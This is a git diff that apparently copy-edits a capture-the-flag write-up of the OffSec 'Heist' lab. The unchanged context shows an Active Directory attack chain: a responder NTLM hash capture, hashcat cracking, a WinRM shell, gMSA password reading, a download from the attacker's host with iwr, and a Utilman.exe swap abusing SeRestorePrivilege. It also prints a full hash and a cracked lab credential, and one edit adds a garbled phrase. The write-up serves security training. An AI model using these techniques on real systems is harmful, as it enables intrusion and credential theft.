@@ -12,7 +12,7 @@ This challenge is an excellent example of how **low-privileged access**, when co
 
 ## Machine Enumeration
 
-Nmap finds 14 open ports at the initial scan. Most of the ports are Active directory generic ports such as, 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269 and 5985. Port 8080 hosted web applications and 3389 RDP port is open.
+Nmap finds 14 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, and 5985. Port 8080 hosted web applications, and the 3389 RDP port is open.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
@@ -67,7 +67,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 53.41 seconds
 ```
 
-Put the all ports Nmap scan in background and started enumerating port 8080 web application.
+Put the all-ports Nmap scan in the backgroundthe port and started enumerating port 8080 web application.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
@@ -125,7 +125,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 62.00 seconds
 ```
 
-This web application allows to search URL’s. First I tried to hit the URL to my web server and it worked. So, I started `responder` to capture the user’s hash with the mindset of that NTLM theft vulnerability.
+This web application allows you to search URLs. First I tried to hit the URL to my web server, and it worked. So, I started `responder` to capture the user’s hash with the mindset of that NTLM theft vulnerability.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image.png)
 
@@ -144,7 +144,7 @@ This web application allows to search URL’s. First I tried to hit the URL to m
 [HTTP] NTLMv2 Hash     : enox::HEIST:1df0e212d6257d39:23B184EAD2049998ADEC53D72857CC80:0101000000000000887D129FC363DC0124F1EC8A1DAF731A0000000002000800460050005800360001001E00570049004E002D00350054003300560036004600410030003900510056000400140046005000580036002E004C004F00430041004C0003003400570049004E002D00350054003300560036004600410030003900510056002E0046005000580036002E004C004F00430041004C000500140046005000580036002E004C004F00430041004C0008003000300000000000000000000000003000003D26B6226A6003CBF24048D56181A122F67E7934A74378295CA2A475A9A2964D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370030000000000000000000
 ```
 
-Successfully got the `enox` user’s NTLM hash. Tried to crack using `hashcat` with rockyou.txt wordlist.
+Successfully got the `enox` user’s NTLM hash. Tried to crack using `hashcat` with the rockyou.txt wordlist.
 
 ```
 C:\...\...\tools\hashcat-7.1.2>hashcat.exe -m 5600 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
@@ -201,7 +201,7 @@ WINRM       192.168.133.165 5985   DC01             [+] heist.offsec\enox:califo
 
 ## Initial Foothold
 
-Try to get a winrm shell using `evil-winrm-py` tool.
+Try to get a WinRM shell using the `evil-winrm-py` tool.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
@@ -231,7 +231,7 @@ evil-winrm-py PS C:\Users\enox\Documents> type ../Desktop/local.txt
 
 ## Privilege Escalation
 
-Using `enox:california` credential, tried to harvest the active directory information and uploaded into the bloodhound.
+Using `enox:california` credential, tried to harvest the active directory information and uploaded it into the bloodhound.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
@@ -263,7 +263,7 @@ INFO: Compressing output into 20251202181658_bloodhound.zip
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image3.png)
 
-As per the windows abuse method. Successfully compromised the `svc_apache$` password. During the compilation time, searched blogs and article about this vulnerability and found a interest walkthrough: https://www.hackingarticles.in/readgmsapassword-attack/.
+As per the Windows abuse method. Successfully compromised the `svc_apache$` password. During the compilation time, I searched blogs and articles about this vulnerability and found an interesting walkthrough: https://www.hackingarticles.in/readgmsapassword-attack/.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
@@ -277,7 +277,7 @@ Users or groups who can read password for svc_apache$:
 
 [https://github.com/rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
 
-Compilation steps: Windows OS > Visual Studio > Open Project Directory > Open Properties and Select .NET Assembler > Build > Build Solution. Once you created GMSAPasswordReader.exe file transfer into the Victim’s system.
+Compilation steps: Windows OS > Visual Studio > Open Project Directory > Open Properties and Select .NET Assembler > Build > Build Solution. Once you have created the GMSAPasswordReader.exe file, transfer it into the victim’s system.
 
 ```
 evil-winrm-py PS C:\Users\enox\Downloads> iwr -uri http://192.168.45.170/GMSAPasswordReader.exe -OutFile GMSAPasswordReader.exe
@@ -310,13 +310,13 @@ Calculating hashes for Current Value
 [*]       des_cbc_md5          : 733D79526E159797
 ```
 
-The SeRestorePrivilege privilege allows a user to circumvent file and directory permissions when restoring backed up files and directories, thus giving the user read and write access to system files.
+The SeRestorePrivilege privilege allows a user to circumvent file and directory permissions when restoring backed-up files and directories, thus giving the user read and write access to system files.
 
-We will use the [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) script to enable this privilege in our PowerShell session. Once EnableSeRestorePrivilege.ps1 file executed on victim’s system then we could get write access to C:\Windows\System32.
+We will use the [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) script to enable this privilege in our PowerShell session. Once the EnableSeRestorePrivilege.ps1 file was executed on the victim’s system, then we could get write access to C:\Windows\System32.
 
 Reference: https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege
 
-After modifying the `C:\Windows\System32` directory. Just swap the Utilman.exe with the cmd.exe file and try to connect victim’s system and start the Utilman.exe application which start the Command prompt as Administrator.
+After modifying the `C:\Windows\System32` directory. Just swap the Utilman.exe with the cmd.exe file and try to connect to the victim’s system and start the Utilman.exe application, which starts the command prompt as administrator.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Heist]
